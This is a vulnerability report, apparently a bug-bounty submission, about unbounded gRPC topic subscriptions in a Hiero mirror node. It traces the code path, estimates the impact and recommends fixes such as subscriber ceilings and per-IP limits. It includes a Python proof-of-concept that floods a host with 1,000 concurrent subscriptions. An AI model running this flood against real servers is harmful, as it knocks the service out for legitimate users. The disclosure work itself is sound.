### Title
Unbounded Subscription Fan-Out Enables Per-Subscriber DB Polling Amplification via `subscribeTopic()`

### Summary
`TopicMessageServiceImpl.subscribeTopic()` imposes no global, per-IP, or per-user limit on the number of concurrent subscriptions. When the `POLL` listener type is active, each call to `listen()` in `PollingTopicListener` creates a fully independent database polling loop, meaning N subscriptions to the same topicId produce N independent DB queries every polling interval. Even under `SHARED_POLL`/`REDIS` modes, each subscriber receives its own `onBackpressureBuffer` allocation and scheduler thread, enabling unbounded memory and thread amplification. Any unauthenticated caller can exploit this.

### Finding Description

**Code path and root cause:**

`TopicMessageServiceImpl.subscribeTopic()` (lines 59–92) creates a new `TopicContext` and wires up `historical`, `live`, and `safetyCheck` Flux pipelines per call with no check against any subscription ceiling:

```java

// ...
// line 89-90: subscriberCount is only a Gauge metric, never enforced
.doOnSubscribe(s -> subscriberCount.incrementAndGet())
.doFinally(s -> subscriberCount.decrementAndGet())
``` [1](#0-0) [2](#0-1) 

`subscriberCount` is registered only as a Micrometer `Gauge` for observability; it is never compared against a maximum and never causes a rejection. [3](#0-2) 

The `TopicMessageFilter` bean validation enforces only `startTime >= 0`, `startTime <= now`, `endTime > startTime`, and `topicId != null` — no subscription-count constraint exists: [4](#0-3) 

**POLL mode — independent DB polling per subscriber:**

`PollingTopicListener.listen()` allocates a fresh `PollingContext` and a new `Flux.defer()`/`repeatWhen` chain on every invocation:

```java
// PollingTopicListener.java:34-49
public Flux<TopicMessage> listen(TopicMessageFilter filter) {
    PollingContext context = new PollingContext(filter);   // new state per subscriber
    ...
    return Flux.defer(() -> poll(context))                // independent DB query loop
            .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                    .withFixedDelay(interval) ...);
}
``` [5](#0-4) 

`poll()` calls `topicMessageRepository.findByFilter(newFilter)` independently for each subscriber: [6](#0-5) 

N subscriptions → N independent `findByFilter` calls every 500 ms (default interval).

**SHARED_POLL / REDIS modes — per-subscriber buffer and thread amplification:**

`SharedTopicListener.listen()` wraps the shared source with a per-subscriber `onBackpressureBuffer(maxBufferSize)` (default 16 384 slots) and a `publishOn(Schedulers.boundedElastic())` dispatch:

```java
// SharedTopicListener.java:21-26
return getSharedListener(filter)
    .onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
    .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
``` [7](#0-6) 

N subscribers → N × 16 384-slot buffers + N elastic-scheduler threads, all receiving the same fanned-out messages.

**Only existing guard — per-connection call limit:**

`GrpcConfiguration` sets `maxConcurrentCallsPerConnection = 5`: [8](#0-7) [9](#0-8) 

This is per-connection only. There is no limit on the number of connections a single IP or client may open, so an attacker opens C connections × 5 calls = 5C concurrent subscriptions with no server-side rejection.

### Impact Explanation

- **POLL mode**: Each of the 5C subscriptions independently polls the database every 500 ms. At C=200 connections, that is 1 000 concurrent DB polling loops, each capable of returning up to 5 000 rows per page — saturating the DB connection pool and I/O.
- **Any mode**: Each subscription holds a 16 384-slot in-memory buffer. At 1 000 subscriptions, that is ~16 M buffer slots allocated on the heap, plus 1 000 elastic-scheduler threads, leading to OOM or thread exhaustion.
- **Network layer**: Every topic message is serialized and written to 5C independent gRPC streams simultaneously, multiplying outbound bandwidth linearly with attacker-controlled C.
- No funds are directly at risk, but the mirror node becomes unavailable to legitimate subscribers — consistent with the stated Medium severity (unintended network-layer behavior, no direct fund loss).

### Likelihood Explanation

No authentication is required to call the gRPC `subscribeTopic` endpoint. The attacker needs only a network path to port 5600 and the ability to open multiple TCP connections — trivially achievable from a single host or a small botnet. The attack is repeatable and stateless: connections can be re-opened immediately after being dropped. The 5-calls-per-connection limit is the only friction, and it is bypassed by opening more connections.

### Recommendation

1. **Enforce a global subscriber ceiling**: Check `subscriberCount` against a configurable `maxSubscribers` property inside `subscribeTopic()` and return `RESOURCE_EXHAUSTED` if exceeded.
2. **Enforce a per-IP connection limit** at the Netty layer (e.g., `NettyServerBuilder.maxConnectionsPerIp` or an equivalent interceptor).
3. **Deduplicate POLL subscriptions by topicId**: In `PollingTopicListener`, cache and share the polling Flux per topicId (as `SharedPollingTopicListener` already does) so N subscribers to the same topic do not produce N independent DB queries.
4. **Add a `maxSubscriptionsPerConnection` or per-IP quota** tracked in a `GrpcInterceptor` that rejects excess `subscribeTopic` calls before they reach the service layer.

### Proof of Concept

```python
import grpc, threading
# proto stubs for hiero mirror node consensus service
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc as cs
from com.hedera.mirror.api.proto import consensus_service_pb2 as cs_pb2
from proto.timestamp_pb2 import Timestamp

TARGET = "mirror-node-host:5600"
TOPIC_ID = "0.0.12345"   # any valid topic
CONNECTIONS = 200         # each opens 5 subscriptions = 1000 total

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = cs.ConsensusServiceStub(channel)
    req = cs_pb2.ConsensusTopicQuery(
        topicID=...,          # set to TOPIC_ID
        consensusStartTime=Timestamp(seconds=0, nanos=0),  # overlapping from epoch
    )
    streams = []
    for _ in range(5):       # maxConcurrentCallsPerConnection = 5
        streams.append(stub.subscribeTopic(req))
    # keep streams open; each independently polls DB (POLL mode)
    # or holds a 16384-slot buffer (SHARED_POLL/REDIS mode)
    for s in streams:
        for _ in s:          # drain to keep alive
            pass

threads = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
# Result: 1000 concurrent subscriptions; POLL mode → 1000 independent DB queries/500ms
#         Any mode → 1000 × 16384 buffer slots + 1000 scheduler threads
```

        PollingContext context = new PollingContext(filter);

                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)

                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
                .name(METRIC)
                .tag(METRIC_TAG, "poll")
                .tap(Micrometer.observation(observationRegistry))
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Starting to poll every {}ms: {}", interval.toMillis(), filter));
    }

    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
